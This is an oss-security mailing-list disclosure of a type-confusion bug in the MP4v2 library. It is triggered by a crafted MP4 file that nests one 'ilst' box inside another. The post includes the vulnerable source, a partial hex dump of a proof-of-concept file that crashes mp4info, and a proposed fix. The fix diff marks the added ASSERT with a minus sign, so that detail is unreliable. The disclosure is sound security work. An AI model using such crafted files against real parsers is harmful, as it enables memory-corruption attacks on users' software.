  oss-security - Type confusion in MP4v2            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 17 Jul From: Ruikai Liu To: oss-security@...ts.openwall.com Subject: Type confusion in MP4v2  Hi,  A type confusion bug is found in MP4v2 a legacy library dealing with MP4 media file.  ========= ilst box =========  According to ref[2], MP4 file could contain an `ilst` box, which stands for item list. Tags such as album, author, etc., are stored here. A typical `ilst` box looks like this:  [ilst box] --> [nam box(full name)] -> [data box]          |---> [cmt box(comment)] -> [data box]          |---> [day box(created time)] -> [data box]          ...  MP4v2 would use `MP4ItemAtom` for nam/cmt/... box, and `MP4DataAtom` for data box:   MP4Atom*  MP4Atom::factory( MP4File &file, MP4Atom* parent, const char* type )  {      // type may be NULL only in case of root-atom      if( !type )          return new MP4RootAtom(file);       // construct atoms which are context-savvy      if( parent ) {          const char* const ptype = parent->GetType();           if( descendsFrom( parent, "ilst" )) {              if( ATOMID( ptype ) == ATOMID( "ilst" ))                  return new MP4ItemAtom( file, type );               if( ATOMID( type ) == ATOMID( "data" ))                  return new MP4DataAtom(file);  However, if a crafted MP4 file has the following structure:  [ilst box] -> [ilst box] -> [data box]  Then `MP4ItemAtom` would be created for the data box instead of `MP4DataAtom`, since its parent is still of type `ilst`.  ========= type confusion =========  Now, to parse the tag info of the MP4 file, `Tags::c_fetch` is called, which invokes `genericGetItems`:  MP4ItmfItemList* genericGetItems( MP4File& file ) {     MP4Atom* ilst = file.FindAtom( "moov.udta.meta.ilst" );     if( !ilst )         return __itemListAlloc();     const uint32_t itemCount = ilst->GetNumberOfChildAtoms();     if( itemCount < 1 )         return __itemListAlloc();     MP4ItmfItemList& list = *__itemListAlloc();     __itemListResize( list, itemCount );     for( uint32_t i = 0; i < list.size; i++ )         __itemAtomToModel( *(MP4ItemAtom*)ilst->GetChildAtom( i ), list.elements[i] );     return &list; }  Here we first find the atom for `ilst`, and then iterate its child atoms. Remember that there's a duplicate `ilst` in the crafted MP4 file, in which case the root `ilst` atom's child is a `MP4ItemAtom` of type `ilst`, and its grandchild is a `MP4ItemAtom` of type `data`.  Then in the function `__itemAtomToModel`, the `MP4ItemAtom` of type `ilst` is parsed:  static bool __itemAtomToModel( MP4ItemAtom& item_atom, MP4ItmfItem& model ) ...     // pass 2: populate data model     for( uint32_t i = 0, idata = 0; i < childCount; i++ ) {         MP4Atom* atom = item_atom.GetChildAtom( i );         if( ATOMID( atom->GetType() ) != ATOMID( "data" ))             continue;         MP4DataAtom& data_atom = *(MP4DataAtom*)atom;  We can see that line would cast its child to `MP4DataAtom` directly, which in fact is a `MP4ItemAtom`. Since these two objects are of different layout, operations on the `data_atom` could lead to memory corruption due to the type confusion.  ========= POC =========  Here we create a MP4 file with two `ilst`s:  root@...ian:~# xxd c3.mp4  ....ftypmp42.... 6f6d 6d6f  mp42isom....moov  ...lmvhd.....4Vx  #Eg....X.vT2..eC  V...............  ................  ................  ................ dead beef  ...............D  udta...<meta....  ...0ilst...(ilst  ....data....data  ....data....data  It results in segfault when running `mp4info`:  root@...ian:~# mp4info c3.mp4 mp4info version -r c3.mp4: ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak Track   Type    Info ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom data missing child atom data ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak Segmentation fault  root@...ian:~# root@...ian:~# dpkg -s mp4v2-utils Package: mp4v2-utils Status: install ok installed Priority: optional Section: sound Installed-Size: Maintainer: Debian Multimedia Maintainers <pkg-multimedia-maintainers@...ts.alioth.debian.org> Architecture: amd64 Source: mp4v2 Version: Depends: (= libc6 (>= libgcc1 (>= libstdc++6 (>= 5.2)  ========= fix =========  The bug is caused by the wrong assumption that the child of an `ilst` can never be an `ilst`. So we could fix it by simply adding an ASSERT:  --- src/mp4atom.cpp     +++ @@ @@           if( descendsFrom( parent, "ilst" )) {              if( ATOMID( ptype ) == ATOMID( "ilst" )) -                ASSERT(ATOMID( type ) != ATOMID( "ilst" ));                  return new MP4ItemAtom( file, type );               if( ATOMID( type ) == ATOMID( "data" )) {    ========= Reference =========  [1] https://code.google.com/archive/p/mp4v2/ [2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt  --  Best regards,  Ruikai Liu  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      